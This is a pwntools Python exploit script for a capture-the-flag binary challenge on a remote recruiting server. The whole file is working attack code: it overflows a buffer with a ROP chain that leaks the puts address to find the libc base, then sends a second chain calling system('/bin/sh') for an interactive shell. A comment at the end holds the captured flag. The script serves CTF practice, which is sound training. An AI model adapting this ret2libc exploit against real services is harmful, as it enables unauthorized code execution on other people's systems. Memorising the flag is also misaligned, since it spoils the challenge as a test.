from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chal', '''
#     b *(main+31)
#     b *(n132+40)
#     b *(main+36)
#     continue
# ''')

p = remote('recruit.osiris.bar', 21003)
p.recvuntil(b"                                                              \n                                                              \n                                                              \n")

e = ELF('./chal')
r = ROP('./chal')
glibc_e = ELF('./libc.so.6')

chain1 = [
    r.rdi.address,
    e.got.puts,
    e.plt.puts,
    e.symbols.main
]

msg1 = p64(r.ret.address)*(0x20-len(chain1)) + b"".join(p64(addr) for addr in chain1)
p.send(msg1)
p.recvline()
glibc_base_addr = u64(p.recvline()[:-1].ljust(8, b"\x00"))-glibc_e.symbols.puts
log.info(f"glibc base address: {hex(glibc_base_addr)}")

chain2 = [
    r.rdi.address,
    next(glibc_e.search(b"/bin/sh"))+glibc_base_addr,
    r.ret.address,
    glibc_e.symbols.system+glibc_base_addr
]

msg2 = p64(r.ret.address)*(0x20-len(chain2)) + b"".join(p64(addr) for addr in chain2)
p.send(msg2)

p.interactive()

# flag{c92828b32cc9494689ccf4bde219dccbda5c561e6d7931105443d08ec28aaacd}
